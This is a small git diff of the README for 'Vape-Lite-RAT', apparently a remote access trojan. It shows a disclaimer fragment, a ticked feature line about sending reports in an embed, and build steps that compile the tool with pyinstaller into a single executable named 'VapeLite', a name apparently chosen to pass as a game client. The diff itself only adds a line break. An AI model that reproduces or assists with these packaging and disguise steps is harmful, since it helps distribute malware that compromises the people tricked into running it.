@@ -16,5 +16,5 @@ By using / utilizing Vape-Lite-RAT you agree that you hold responsibility and ac
 - [x] Sends in a fancy embed.
 
 # To build
-``pyinstaller --onefile -n VapeLite`` | https://pyinstaller.readthedocs.io/en/stable/requirements.html
+``pyinstaller --onefile -n VapeLite`` | https://pyinstaller.readthedocs.io/en/stable/requirements.html <br>
 Auto-py-to-exe | https://pypi.org/project/auto-py-to-exe/
